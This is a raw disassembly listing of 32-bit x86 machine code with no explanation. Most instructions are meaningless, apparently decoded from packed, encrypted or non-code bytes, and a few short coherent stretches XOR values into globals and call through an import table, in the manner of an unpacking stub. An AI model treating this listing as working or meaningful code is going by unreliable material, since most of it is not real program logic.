  40f7fa:	sbb    eax,DWORD PTR [ebp-0x6d1ece2f]
  40f800:	or     DWORD PTR [ebx-0x64824c4e],esi
  40f806:	loopne 0x40f822
  40f808:	inc    ah
  40f80a:	call   0x933c030e
  40f80f:	aas    
  40f810:	mov    edi,0x7cb8f42
  40f815:	xor    edx,DWORD PTR [eax]
  40f817:	data16 and al,0xe2
  40f81a:	icebp  
  40f81b:	xlat   BYTE PTR ds:[ebx]
  40f81c:	mov    edx,0x398c4299
  40f821:	mov    eax,ds:0x9bf23cf7
  40f826:	ret    
  40f827:	mov    ds,WORD PTR [eax]
  40f829:	jo     0x40f89d
  40f82b:	ins    DWORD PTR es:[edi],dx
  40f82c:	jmp    0x40f85a
  40f82e:	inc    edi
  40f82f:	popa   
  40f830:	lock mov edi,0x6708f392
  40f836:	iret   
  40f837:	cmp    al,0x3d
  40f839:	dec    edi
  40f83a:	aaa    
  40f83b:	jmp    0xf571ebbc
  40f840:	stc    
  40f841:	repnz shl al,0x7d
  40f845:	imul   edi,DWORD PTR [eax+0x53],0xdd9b4814
  40f84c:	stos   DWORD PTR es:[edi],eax
  40f84d:	and    eax,0xa3d2d569
  40f852:	mov    ecx,0x4f38a7b7
  40f857:	iret   
  40f858:	popf   
  40f859:	es jecxz 0x40f888
  40f85c:	push   eax
  40f85d:	dec    esp
  40f85e:	add    DWORD PTR [ebx+0x2b],edi
  40f861:	fwait
  40f862:	pusha  
  40f863:	or     ebp,ebx
  40f865:	xchg   edi,eax
  40f866:	scas   al,BYTE PTR es:[edi]
  40f867:	(bad)  
  40f868:	xor    DWORD PTR [edi+0x49],esi
  40f86b:	xchg   ebx,eax
  40f86c:	pusha  
  40f86d:	mov    cs,WORD PTR [edx+edx*4]
  40f870:	xor    eax,0xe095aaf
  40f875:	clc    
  40f876:	nop
  40f877:	mov    esp,0x7e8a4e31
  40f87c:	jg     0x40f8e7
  40f87e:	ret    0x1734
  40f881:	cmp    eax,0x7ff14f88
  40f886:	fstp   DWORD PTR [ebx+0x2c]
  40f889:	test   eax,0x4a7a5b34
  40f88e:	jmp    0x94be:0xce4d0f51
  40f895:	stos   DWORD PTR es:[edi],eax
  40f896:	(bad)  
  40f897:	scas   al,BYTE PTR es:[edi]
  40f898:	imul   esi,DWORD PTR [esi-0x12],0x68110368
  40f89f:	out    dx,al
  40f8a0:	daa    
  40f8a1:	and    al,0xa5
  40f8a3:	arpl   WORD PTR [esi],si
  40f8a5:	cwde   
  40f8a6:	out    dx,eax
  40f8a7:	pop    ebp
  40f8a8:	jnp    0x40f82e
  40f8aa:	sub    ebx,DWORD PTR [edx+0x6ee7ab46]
  40f8b0:	sbb    ch,BYTE PTR [esi]
  40f8b2:	jne    0x40f862
  40f8b4:	(bad)  
  40f8b5:	fwait
  40f8b6:	(bad)  
  40f8b7:	ins    DWORD PTR es:[edi],dx
  40f8b8:	push   edi
  40f8b9:	sbb    esp,esi
  40f8bb:	sbb    bh,0x9c
  40f8be:	adc    al,0x52
  40f8c0:	xchg   DWORD PTR [ecx],esp
  40f8c2:	sbb    bl,0xe
  40f8c5:	das    
  40f8c6:	dec    edx
  40f8c7:	enter  0xbaae,0xd2
  40f8cb:	cmp    ecx,edx
  40f8cd:	pop    esi
  40f8ce:	ficom  DWORD PTR [edx-0x314f55f0]
  40f8d4:	cmc    
  40f8d5:	mov    ds:0xbc50ad32,eax
  40f8da:	pop    ss
  40f8db:	mov    ecx,0x5a8b74de
  40f8e0:	repnz and DWORD PTR [ebx+0x4d8bfc45],ecx
  40f8e7:	or     al,0x81
  40f8e9:	xor    eax,0x4346bf
  40f8ee:	dec    edi
  40f8ef:	inc    edi
  40f8f0:	inc    ebx
  40f8f1:	add    BYTE PTR [ebx],dh
  40f8f3:	mov    DWORD PTR [ebx],0xb05c7c6
  40f8f9:	inc    edi
  40f8fa:	inc    ebx
  40f8fb:	add    BYTE PTR [ebx+0x3b00004b],ch
  40f901:	rol    edi,0x5
  40f904:	pop    DWORD PTR [edi+0x43]
  40f907:	add    BYTE PTR [ebx+0x3e],dl
  40f90a:	add    BYTE PTR [eax],al
  40f90c:	je     0x40fd56
  40f912:	and    DWORD PTR ds:0x434713,edi
  40f918:	mov    eax,DWORD PTR [ebp-0x4]
  40f91b:	mov    edx,DWORD PTR ds:0x43466b
  40f921:	xor    DWORD PTR ds:0x4346d3,edx
  40f927:	xor    eax,edi
  40f929:	and    DWORD PTR ds:0x43473f,0x0
  40f933:	mov    edx,DWORD PTR ds:0x43473f
  40f939:	inc    edx
  40f93a:	mov    DWORD PTR ds:0x43473f,edx
  40f940:	cmp    DWORD PTR ds:0x43473f,0x9
  40f947:	jne    0x40f96a
  40f94d:	push   0x4346cb
  40f952:	push   0x434812
  40f957:	push   0x7b5f
  40f95c:	push   0x5aad
  40f961:	push   DWORD PTR [ebp-0xc]
  40f964:	call   DWORD PTR ds:0x4132a4
  40f96a:	cmp    DWORD PTR ds:0x43473f,0x8
  40f971:	jne    0x40f986
  40f977:	xor    edx,edx
  40f979:	xor    edx,DWORD PTR ds:0x43473f
  40f97f:	inc    edx
  40f980:	mov    DWORD PTR ds:0x43473f,edx
  40f986:	cmp    DWORD PTR ds:0x43473f,0x10
  40f98d:	jb     0x40f933
  40f993:	and    DWORD PTR ds:0x43473f,edx
  40f999:	add    eax,esi
  40f99b:	push   eax
  40f99c:	push   DWORD PTR [ebp-0x8]
  40f99f:	push   DWORD PTR [ebp-0x4]
  40f9a2:	mov    edx,DWORD PTR ds:0x414afe
  40f9a8:	jmp    0x40fd3b
  40f9ad:	pop    ebx
  40f9ae:	pop    edi
  40f9af:	cld    
  40f9b0:	sub    edi,esp
  40f9b2:	mov    ebp,0x81a66f6d
  40f9b7:	push   esi
  40f9b8:	in     eax,dx
  40f9b9:	(bad)  
  40f9ba:	in     al,0x7a
  40f9bc:	jb     0x40f9d2
  40f9be:	mov    ebp,0x79f47e7e
  40f9c3:	jle    0x40fa43
  40f9c5:	jns    0x40fa3b
  40f9c7:	or     bh,ch
  40f9c9:	pop    ecx
  40f9ca:	in     eax,0x25
  40f9cc:	jmp    0x18:0x2f3b9f3
  40f9d3:	adc    ah,BYTE PTR [edi]
  40f9d5:	dec    ecx
  40f9d6:	mov    esi,edi
  40f9d8:	ja     0x40f9b0
  40f9da:	xor    DWORD PTR [ebx],edi
  40f9dc:	sub    dl,bh
  40f9de:	sub    dh,cl
  40f9e0:	stc    
  40f9e1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f9e2:	lea    ebp,ds:0x4f9cf23b
  40f9e8:	pop    ebx
  40f9e9:	add    al,0xd5
  40f9eb:	mov    edi,0x384c159b
  40f9f0:	pop    ecx
  40f9f1:	bound  edx,QWORD PTR ds:0xdc54c057
  40f9f7:	jmp    0x3e85:0x96e9bb94
  40f9fe:	lods   al,BYTE PTR ds:[esi]
  40f9ff:	fdivr  QWORD PTR [esi]
  40fa01:	std    
  40fa02:	pop    eax
  40fa03:	or     BYTE PTR [eax],dl
  40fa05:	adc    al,0xb8
  40fa07:	les    esp,FWORD PTR [edi-0x2b]
  40fa0a:	mov    ecx,0xd27685f8
  40fa0f:	outs   dx,DWORD PTR ds:[esi]
  40fa10:	ja     0x40f9a5
  40fa12:	inc    edx
  40fa13:	pushf  
  40fa14:	outs   dx,DWORD PTR ds:[esi]
  40fa15:	xchg   dh,dh
  40fa17:	mov    esi,esp
  40fa19:	jmp    0xd677779f
  40fa1e:	ds dec ebx
  40fa20:	cmp    BYTE PTR [ebp+0x68d7ec39],dl
  40fa26:	ins    BYTE PTR es:[edi],dx
  40fa27:	and    eax,0xcd21194b
  40fa2c:	push   edi
  40fa2d:	into   
  40fa2e:	mov    edi,0xa19db8da
  40fa33:	stos   DWORD PTR es:[edi],eax
  40fa34:	in     eax,dx
  40fa35:	mov    edx,0xf5eb92bd
  40fa3a:	in     eax,0xaf
  40fa3c:	inc    edx
  40fa3d:	xchg   ebp,eax
  40fa3e:	xchg   edx,eax
  40fa3f:	adc    DWORD PTR [eax],0x143f3f1e
  40fa45:	bnd ja 0x40fa26
  40fa48:	xor    DWORD PTR [si],eax
  40fa4b:	push   ds
  40fa4c:	cdq    
  40fa4d:	aas    
  40fa4e:	fst    QWORD PTR [ebx+eax*1-0x7d]
  40fa52:	pop    edx
  40fa53:	dec    ebp
  40fa54:	cmp    al,0x68
  40fa56:	cdq    
  40fa57:	push   0x5d
  40fa59:	dec    esi
  40fa5a:	cmp    DWORD PTR [esi-0xd],ebx
  40fa5d:	cmp    DWORD PTR [ebx-0x1f4d9b13],ebp
  40fa63:	pop    ss
  40fa64:	xchg   esp,eax
  40fa65:	repz test ebx,ebp
  40fa68:	outs   dx,DWORD PTR ds:[esi]
  40fa69:	iret   
  40fa6a:	mov    ds:0x6a534f07,al
  40fa6f:	addr16 push ebx
  40fa71:	lds    eax,FWORD PTR [edi-0x39]
  40fa74:	and    bh,dh
  40fa76:	jg     0x40fa45
  40fa78:	js     0x40fa16
  40fa7a:	add    BYTE PTR [edx],al
  40fa7c:	pushf  
  40fa7d:	or     al,0x8b
  40fa7f:	cmp    al,0x81
  40fa81:	pop    edi
  40fa82:	add    ch,bl
  40fa84:	push   esi
  40fa85:	dec    eax
  40fa86:	cs sub dl,al
  40fa89:	cmp    al,0x7c
  40fa8b:	and    eax,0x7a645f0e
  40fa90:	dec    esi
  40fa91:	cld    
  40fa92:	push   cs
  40fa93:	or     al,0x77
  40fa95:	ret    
  40fa96:	mov    BYTE PTR [ecx+0x244305b3],al
  40fa9c:	xchg   BYTE PTR [edx+0x12],dh
  40fa9f:	pop    eax
  40faa0:	push   esp
  40faa1:	call   0x19d4:0x4f662781
  40faa8:	arpl   WORD PTR [ecx+0x22],cx
  40faab:	push   ds
  40faac:	and    DWORD PTR [ebx+0x1d],esi
  40faaf:	xor    BYTE PTR [esi+0x4a],dl
  40fab2:	xor    al,0x6d
  40fab4:	inc    DWORD PTR [ecx+0x60be6f3f]
  40faba:	call   0xe52e:0xdf212b35
  40fac1:	push   0xffffffa8
  40fac3:	mov    bh,BYTE PTR [ecx-0x1c14cafd]
  40fac9:	out    0xe5,al
  40facb:	mov    bl,0x14
  40facd:	cld    
  40face:	inc    ecx
  40facf:	sub    eax,0x6f2ad463
  40fad4:	mov    WORD PTR [edx+0x3c7b3841],es
  40fada:	test   BYTE PTR [esi+ecx*1-0x35243c37],ah
  40fae1:	(bad)  
  40fae2:	pop    ds
  40fae3:	dec    ecx
  40fae4:	daa    
  40fae5:	test   BYTE PTR [ebp-0xb3a579d],ch
  40faeb:	inc    ecx
  40faec:	cmp    BYTE PTR [ebx+0x71916b0d],dl
  40faf2:	mov    esi,0x6deb32a9
  40faf7:	jecxz  0x40fb01
  40faf9:	mov    WORD PTR [esi+ebp*4+0x4f7ea5db],?
  40fb00:	add    ch,BYTE PTR [edx]
  40fb02:	das    
  40fb03:	push   ebp
  40fb04:	stos   BYTE PTR es:[edi],al
  40fb05:	sbb    eax,ebx
  40fb07:	scas   al,BYTE PTR es:[edi]
  40fb08:	add    DWORD PTR [edi],ebx
  40fb0a:	or     BYTE PTR [ebp-0x6c22c5c7],bh
  40fb10:	and    BYTE PTR [ebx+0x75],dh
  40fb13:	jg     0x40fb90
  40fb15:	fcom   QWORD PTR [ecx]
  40fb17:	cmp    esp,edi
  40fb19:	jne    0x40faca
  40fb1b:	push   ss
  40fb1c:	fcomip st,st(6)
  40fb1e:	pop    eax
  40fb1f:	inc    ebp
  40fb20:	in     al,0x36
  40fb22:	pop    edx
  40fb23:	inc    esi
  40fb24:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fb25:	push   ebp
  40fb26:	jnp    0x40fb3c
  40fb28:	sbb    al,0x2a
  40fb2a:	sbb    ebx,ebp
  40fb2c:	xor    bl,BYTE PTR [edi-0x21]
  40fb2f:	loop   0x40fb88
  40fb31:	gs inc ebp
  40fb33:	test   esi,edi
  40fb35:	jmp    0xe6b0:0x1b582c4f
  40fb3c:	adc    eax,0xa565754a
  40fb41:	add    BYTE PTR [esi],0x1e
  40fb44:	ja     0x40faec
  40fb46:	and    eax,0xddf268b1
  40fb4b:	in     al,0xc0
  40fb4d:	retf   
  40fb4e:	icebp  
  40fb4f:	cs (bad) 
  40fb51:	jnp    0x40fb35
  40fb53:	mov    ebp,0x7690768b
  40fb58:	mov    BYTE PTR [ebx+0x3f],dl
  40fb5b:	mov    ch,0x23
  40fb5d:	lods   al,BYTE PTR ds:[esi]
  40fb5e:	call   0x6518b57d
  40fb63:	(bad)  
  40fb64:	pop    edi
  40fb65:	hlt    
  40fb66:	push   ds
  40fb67:	jl     0x40fb64
  40fb69:	push   0xffffffff
  40fb6b:	mov    esi,0xd72c109e
  40fb70:	add    bl,BYTE PTR [ecx+0x2e]
  40fb73:	cmc    
  40fb74:	pop    ebp
  40fb75:	gs shr bl,1
  40fb78:	js     0x40fb9d
  40fb7a:	arpl   WORD PTR [esi-0x34],sp
  40fb7d:	fild   QWORD PTR [esi+ecx*4]
  40fb80:	adc    al,0xb
  40fb82:	mov    al,ds:0x1bcf70b5
  40fb87:	les    eax,FWORD PTR es:[ebx]
  40fb8a:	dec    esi
  40fb8b:	sub    BYTE PTR [ebx],dh
  40fb8d:	dec    ecx
  40fb8e:	cmp    al,0x2
  40fb90:	ss sub al,0x24
  40fb93:	(bad)  
  40fb94:	dec    eax
  40fb95:	je     0x40fb44
  40fb97:	loope  0x40fbab
  40fb99:	xchg   esp,eax
  40fb9a:	mov    es,WORD PTR [ebx+ecx*1-0x4d81c9fc]
  40fba1:	and    DWORD PTR [edi],ecx
  40fba3:	add    DWORD PTR [esi],edx
  40fba5:	push   ds
  40fba6:	fild   QWORD PTR [ebx+0x52]
  40fba9:	mov    esi,0xb791baf6
  40fbae:	inc    ecx
  40fbaf:	mov    bh,0x38
  40fbb1:	push   ds
  40fbb2:	lods   eax,DWORD PTR ds:[esi]
  40fbb3:	dec    edx
  40fbb4:	das    
  40fbb5:	push   esi
  40fbb6:	ror    BYTE PTR [ebx],cl
  40fbb8:	mov    edx,0xf51066ec
  40fbbd:	sub    esp,DWORD PTR [ecx-0x4720685e]
  40fbc3:	lea    eax,[esi-0x70]
  40fbc6:	(bad)  
  40fbc7:	sbb    al,0xe6
  40fbc9:	ins    BYTE PTR es:[edi],dx
  40fbca:	fdiv   DWORD PTR [esi]
  40fbcc:	dec    ecx
  40fbcd:	jmp    0x8a75ca67
  40fbd2:	push   0x66ab2e41
  40fbd7:	ins    BYTE PTR es:[edi],dx
  40fbd8:	cmp    ebp,DWORD PTR fs:[ebp+0xa]
  40fbdc:	fadd   DWORD PTR [esi+0x51]
  40fbdf:	sahf   
  40fbe0:	pop    ecx
  40fbe1:	mov    ebp,0xc7a39cc2
  40fbe6:	push   edx
  40fbe7:	sbb    al,al
  40fbe9:	xchg   ebx,eax
  40fbea:	lahf   
  40fbeb:	jle    0x40fc25
  40fbed:	(bad)  
  40fbee:	mov    ecx,0x3b541be6
  40fbf3:	imul   eax,ebx,0xffffffb8
  40fbf6:	add    ebx,DWORD PTR [esi+0x3a]
  40fbf9:	jae    0x40fc45
  40fbfb:	cmp    eax,0xec57b61a
  40fc00:	lods   eax,DWORD PTR ds:[esi]
  40fc01:	fld    TBYTE PTR [ecx]
  40fc03:	les    eax,FWORD PTR [ebp+0x5]
  40fc06:	dec    eax
  40fc07:	mov    ecx,0xf88cc153
  40fc0c:	fistp  DWORD PTR [ebp-0x26]
  40fc0f:	popa   
  40fc10:	lahf   
  40fc11:	loope  0x40fba0
  40fc13:	or     esi,ecx
  40fc15:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fc16:	fs cwde 
  40fc18:	sub    ch,bh
  40fc1a:	sbb    DWORD PTR [eax+0x7b],edi
  40fc1d:	(bad)  
  40fc1e:	mov    eax,ds:0x542c4dc4
  40fc23:	or     ebp,DWORD PTR ds:0x43ff9cf7
  40fc29:	lock mov esp,0xaac5a17a
  40fc2f:	push   edx
  40fc30:	adc    ebx,edx
  40fc32:	jg     0x40fc3b
  40fc34:	aaa    
  40fc35:	jns    0x40fc8f
  40fc37:	mov    dl,0xe2
  40fc39:	hlt    
  40fc3a:	nop
  40fc3b:	mov    gs,WORD PTR [esi-0x6]
  40fc3e:	imul   esp,DWORD PTR [edi-0x26fde57e],0x371cf5b7
  40fc48:	or     DWORD PTR [edi+ebp*1+0x9],edi
  40fc4c:	xchg   esp,edx
  40fc4e:	imul   ebp,DWORD PTR [ebx-0x1f55ea75],0x79
  40fc55:	fbstp  TBYTE PTR [ecx]
  40fc57:	jmp    0x23d2e8e3
  40fc5c:	sub    DWORD PTR [ebx+edx*8],edx
  40fc5f:	xlat   BYTE PTR ds:[ebx]
  40fc60:	ud0    edx,DWORD PTR [edi+0x7d1e691d]
  40fc67:	rol    DWORD PTR [esi+0x7b],cl
  40fc6a:	out    0x8e,eax
  40fc6c:	jb     0x40fc5a
  40fc6e:	ret    
  40fc6f:	and    al,0xf2
  40fc71:	xchg   DWORD PTR [edx-0x6b02495e],ebp
  40fc77:	xlat   BYTE PTR ds:[ebx]
  40fc78:	popf   
  40fc79:	xor    BYTE PTR [ebp-0x36],ch
  40fc7c:	cs mov bl,0xbb
  40fc7f:	push   0xffffffaa
  40fc81:	jge    0x40fc1f
  40fc83:	jl     0x40fcd3
  40fc85:	cmp    ch,BYTE PTR [eax-0x31]
  40fc88:	xor    al,0x24
  40fc8a:	pop    ebp
  40fc8b:	xlat   BYTE PTR ds:[ebx]
  40fc8c:	je     0x40fc40
  40fc8e:	mov    ?,WORD PTR [esi+eax*8-0x4911274f]
  40fc95:	mov    bl,0xce
  40fc97:	jmp    0x40fc78
  40fc99:	cmp    DWORD PTR [ebx],esi
  40fc9b:	push   ebp
  40fc9c:	fdiv   DWORD PTR [ecx+0x1c4100a5]
  40fca2:	mov    bl,0x63
  40fca4:	aas    
  40fca5:	(bad)  
  40fca6:	mov    ebx,0x42060a38
  40fcab:	cli    
  40fcac:	fisubr DWORD PTR [edx]
  40fcae:	popa   
  40fcaf:	aaa    
  40fcb0:	call   0x720c:0xb7257b7
  40fcb7:	sub    al,0x8c
  40fcb9:	and    bh,bh
  40fcbb:	or     al,BYTE PTR [eax+0x72]
  40fcbe:	aad    0x20
  40fcc0:	adc    DWORD PTR [eax+0x2cebfbbd],ebp
  40fcc6:	aam    0x68
  40fcc8:	cdq    
  40fcc9:	dec    ebx
  40fcca:	out    dx,al
  40fccb:	in     eax,dx
  40fccc:	shr    DWORD PTR [ebx+0x380646b7],1
  40fcd2:	aaa    
  40fcd3:	call   0xf71a:0x9fa1a6e0
  40fcda:	ficom  WORD PTR [eax]
  40fcdc:	xor    al,0x58
  40fcde:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fcdf:	fstp   DWORD PTR [ebx+0x25769fa1]
  40fce5:	out    0x47,al
  40fce7:	call   0x38e00a11
  40fcec:	sub    esi,DWORD PTR [edi+eiz*2-0x15]
  40fcf0:	push   es
  40fcf1:	bnd jno 0x40fca2
  40fcf4:	cmc    
  40fcf5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fcf6:	imul   ebp,ebp,0x30c18bc8
  40fcfc:	pop    esi
  40fcfd:	xor    al,0xa8
  40fcff:	mov    cl,0xa7
  40fd01:	in     al,0x97
  40fd03:	pop    edx
  40fd04:	xchg   ecx,eax
  40fd05:	push   ecx
  40fd06:	push   0x7e
  40fd08:	in     al,dx
  40fd09:	mov    ebx,0xca206a06
  40fd0e:	into   
  40fd0f:	mov    ch,0xb1
  40fd11:	jae    0x40fd30
  40fd13:	js     0x40fcd2
  40fd15:	xlat   BYTE PTR ds:[ebx]
  40fd16:	inc    edi
  40fd17:	out    dx,al
  40fd18:	(bad)  
  40fd19:	sbb    dl,bh
  40fd1b:	xchg   DWORD PTR [edx-0x72c627d],esi
  40fd21:	mov    ebx,0xc96ec15a
  40fd26:	mov    edi,0x7e93238b
  40fd2b:	int    0x1c
  40fd2d:	loop   0x40fd83
  40fd2f:	sbb    edx,edi
  40fd31:	fsubp  st(4),st
  40fd33:	imul   bp,WORD PTR [ebx],0xffff
  40fd37:	or     al,0x6e
  40fd39:	repz push ecx
  40fd3b:	call   0x41098a
  40fd40:	mov    ecx,DWORD PTR ds:0x414afe
  40fd46:	mov    ecx,DWORD PTR [ecx+0x1cc]
  40fd4c:	mov    DWORD PTR [ecx],eax
  40fd4e:	mov    eax,DWORD PTR [ebp-0x8]
  40fd51:	jmp    0x410121
  40fd56:	mov    eax,DWORD PTR [ebp-0x4]
  40fd59:	mov    ecx,DWORD PTR [ebp+0x10]
  40fd5c:	xor    eax,edi
  40fd5e:	add    eax,esi
  40fd60:	cmp    eax,ecx
  40fd62:	jne    0x41011e
  40fd68:	mov    eax,DWORD PTR [ebp-0x4]
  40fd6b:	xor    eax,edi
  40fd6d:	add    eax,esi
  40fd6f:	mov    ds:0x414b82,eax
  40fd74:	mov    eax,DWORD PTR [ebp-0x4]
  40fd77:	xor    eax,edi
  40fd79:	add    eax,esi
  40fd7b:	mov    ds:0x414b7a,eax
  40fd80:	push   DWORD PTR [ebp-0x8]
  40fd83:	push   DWORD PTR [ebp-0x4]
  40fd86:	call   0x408384
  40fd8b:	jmp    0x41011e
  40fd90:	in     eax,0x27
  40fd92:	ss xor bh,ah
  40fd95:	xor    esp,ebp
  40fd97:	icebp  
  40fd98:	add    DWORD PTR [eax+esi*4+0x77],edi
  40fd9c:	mov    edi,0x82c8c894
  40fda1:	mov    eax,0x79f47e7e
  40fda6:	jle    0x40fe26
  40fda8:	into   
  40fda9:	add    DWORD PTR [ecx+eiz*2],esp
  40fdac:	ja     0x40fdd8
  40fdae:	fisttp DWORD PTR [ecx]
  40fdb0:	(bad)  
  40fdb1:	push   0xe6a285f8
  40fdb6:	sbb    esi,ecx
  40fdb8:	retf   
  40fdb9:	dec    edi
  40fdba:	mov    ds:0xad60b916,eax
  40fdbf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fdc0:	dec    esp
  40fdc1:	shr    DWORD PTR [ebx+0x46ea6cde],0x45
  40fdc8:	ss sbb bl,bl
  40fdcb:	jmp    0x40fe0a
  40fdcd:	ja     0x26947c1b
  40fdd3:	mov    ds:0xcce70e84,eax
  40fdd8:	adc    BYTE PTR ds:0xeb241771,ch
  40fdde:	xlat   BYTE PTR ds:[ebx]
  40fddf:	and    al,0x3a
  40fde1:	xchg   ebx,eax
  40fde2:	mov    edi,ebx
  40fde4:	inc    ebp
  40fde5:	aas    
  40fde6:	sub    DWORD PTR [ecx+0x1ad0b72c],ebx
  40fdec:	adc    edx,DWORD PTR [edx+ebp*1+0x57]
  40fdf0:	stos   DWORD PTR es:[edi],eax
  40fdf1:	scas   eax,DWORD PTR es:[edi]
  40fdf2:	outs   dx,BYTE PTR ds:[esi]
  40fdf3:	fidiv  DWORD PTR [edi-0x39e03629]
  40fdf9:	ficom  DWORD PTR ds:0xad14eac5
  40fdff:	mov    edi,0x19ef9be0
  40fe04:	adc    bl,BYTE PTR [eax+0x39987388]
  40fe0a:	inc    esi
  40fe0b:	jl     0x40fe37
  40fe0d:	stc    
  40fe0e:	rcl    DWORD PTR [esi+0x50],cl
  40fe11:	ds mov ebx,0x366df843
  40fe17:	pop    ss
  40fe18:	or     DWORD PTR [edx-0x60],ebx
  40fe1b:	popa   
  40fe1c:	cmc    
  40fe1d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fe1e:	pop    ds
  40fe1f:	xor    al,0x39
  40fe21:	shr    esi,1
  40fe23:	or     ebx,DWORD PTR [edx]
  40fe25:	jp     0x40fdef
  40fe27:	cmc    
  40fe28:	xchg   edx,eax
  40fe29:	adc    edx,DWORD PTR [esi+ebx*2+0x6974cccd]
  40fe30:	mov    esi,0x53903beb
  40fe35:	scas   al,BYTE PTR es:[edi]
  40fe36:	test   al,0xd4
  40fe38:	in     al,0xb3
  40fe3a:	loope  0x40fe95
  40fe3c:	ret    
  40fe3d:	dec    ecx
  40fe3e:	repz repz cwde 
  40fe41:	lea    esi,[eax+eax*2]
  40fe44:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fe45:	js     0x40fe45
  40fe47:	fldenv [ecx+0x1291945b]
  40fe4d:	mov    ebp,eax
  40fe4f:	gs fcmovu st,st(0)
  40fe52:	inc    ecx
  40fe53:	les    edx,FWORD PTR [esi+esi*8-0x1c]
  40fe57:	mov    DWORD PTR ds:0x46a90cce,ecx
  40fe5e:	add    eax,DWORD PTR ds:0x344e00d2
  40fe64:	inc    ebx
  40fe65:	mov    ds:0xaed6037a,al
  40fe6a:	fidivr WORD PTR [ebp-0x572c74fd]
  40fe70:	mov    dh,BYTE PTR [edx+0x175a7fff]
  40fe76:	inc    esi
  40fe77:	add    DWORD PTR [esi],0x9197cda6
  40fe7d:	push   ebx
  40fe7e:	and    bh,BYTE PTR [edx]
  40fe80:	int3   
  40fe81:	scas   eax,DWORD PTR es:[edi]
  40fe82:	dec    esp
  40fe83:	add    eax,0x6f3f9b3e
  40fe88:	popa   
  40fe89:	push   cs
  40fe8a:	xor    DWORD PTR [esi],ebx
  40fe8c:	lock call 0x4efe:0x3d2cfedf
  40fe94:	adc    edx,DWORD PTR [ebx+0x153485b9]
  40fe9a:	mov    edx,0xe5349eb2
  40fe9f:	pop    ebx
  40fea0:	fnstsw WORD PTR [eax]
  40fea2:	in     eax,dx
  40fea3:	jmp    0x1dc18a7a
  40fea8:	cmp    DWORD PTR ds:0x41d77e0f,0x37
  40feaf:	hlt    
  40feb0:	loopne 0x40ff1d
  40feb2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40feb3:	sub    dh,BYTE PTR [eax+0x6c5e992d]
  40feb9:	xor    esi,edx
  40febb:	rol    BYTE PTR [edi],0x62
  40febe:	mov    dh,0x57
  40fec0:	scas   al,BYTE PTR es:[edi]
  40fec1:	add    BYTE PTR [eax],bh
  40fec3:	mov    dl,0x93
  40fec5:	retf   0x7eed
  40fec8:	repnz mov esp,0x9068ec3e
  40fece:	(bad)  
  40fecf:	jmp    0x7a0c:0x88e6c515
  40fed6:	jmp    0x8db:0xfb2a8158
  40fedd:	data16 aam 0x5d
  40fee0:	mov    ah,0xcf
  40fee2:	fwait
  40fee3:	inc    esp
  40fee4:	and    BYTE PTR [edx],bl
  40fee6:	inc    esi
  40fee7:	adc    ah,BYTE PTR [ecx]
  40fee9:	push   edi
  40feea:	and    ebp,esi
  40feec:	mov    esi,0x5166c911
  40fef1:	jle    0x40fe88
  40fef3:	push   ds
  40fef4:	cmp    BYTE PTR [eax+0x363ba6b2],dh
  40fefa:	gs into 
  40fefc:	jno    0x40fec6
  40fefe:	dec    edi
  40feff:	push   ebp
  40ff00:	mov    gs,WORD PTR [edx+0x40bf7dc5]
  40ff06:	fist   WORD PTR [ecx+0x8]
  40ff09:	dec    esi
  40ff0a:	retf   
  40ff0b:	sub    eax,0xf20f84eb
  40ff10:	pop    ds
  40ff11:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ff12:	out    dx,eax
  40ff13:	or     BYTE PTR [esi-0x40],al
  40ff16:	xchg   edi,eax
  40ff17:	mov    esp,0x1193912f
  40ff1c:	imul   esp,ebx,0x83b62d3d
  40ff22:	mov    ds:0x43dcdf5f,al
  40ff27:	push   edx
  40ff28:	(bad)  
  40ff29:	mov    edi,0xab4ea79f
  40ff2e:	loop   0x40ff03
  40ff30:	and    edx,DWORD PTR [ebp-0x293ab22d]
  40ff36:	stc    
  40ff37:	bound  eax,QWORD PTR [edi]
  40ff39:	mov    bl,0x4a
  40ff3b:	out    dx,al
  40ff3c:	mov    ch,0x55
  40ff3e:	rcr    BYTE PTR ss:[edi-0x58],cl
  40ff42:	in     eax,0x94
  40ff44:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ff45:	cmp    ebx,ecx
  40ff47:	push   0xf8184d2b
  40ff4c:	or     al,BYTE PTR [ebp+0xf]
  40ff4f:	sbb    ch,BYTE PTR ds:0x3042a5ff
  40ff55:	or     eax,0x5afa455e
  40ff5a:	sbb    eax,0xc2b88d1a
  40ff5f:	je     0x40ff6f
  40ff61:	sub    al,0x31
  40ff63:	(bad)  [edx+0x44]
  40ff66:	mov    bh,0x16
  40ff68:	icebp  
  40ff69:	cmp    BYTE PTR [ebx+0x27],ch
  40ff6c:	lock popf 
  40ff6e:	adc    BYTE PTR [esi+0x11],bh
  40ff71:	push   ebp
  40ff72:	rcr    DWORD PTR [esi+0x36],0x99
  40ff76:	test   al,0x4a
  40ff78:	mov    ds:0x8f9fcd0b,eax
  40ff7d:	pop    ebp
  40ff7e:	mov    ebp,0xc3751564
  40ff83:	push   cs
  40ff84:	das    
  40ff85:	mov    cl,0x18
  40ff87:	or     DWORD PTR [ecx+0x11],edx
  40ff8a:	nop
  40ff8b:	cmp    al,0xbd
  40ff8d:	sub    BYTE PTR [ebx+0x50],al
  40ff90:	cmp    BYTE PTR [edx],ah
  40ff92:	jmp    0x40ff6a
  40ff94:	pushf  
  40ff95:	es push es
  40ff97:	pop    edi
  40ff98:	ja     0x40ff27
  40ff9a:	sar    DWORD PTR [ecx+eax*1+0x36],1
  40ff9e:	push   ss
  40ff9f:	hlt    
  40ffa0:	xchg   edx,eax
  40ffa1:	inc    esp
  40ffa2:	and    eax,0xfafe9ae2
  40ffa7:	sahf   
  40ffa8:	ss repz pop edx
  40ffab:	dec    eax
  40ffac:	ins    BYTE PTR es:[di],dx
  40ffae:	hlt    
  40ffaf:	mov    dl,0x45
  40ffb1:	xlat   BYTE PTR ds:[ebx]
  40ffb2:	pop    ebp
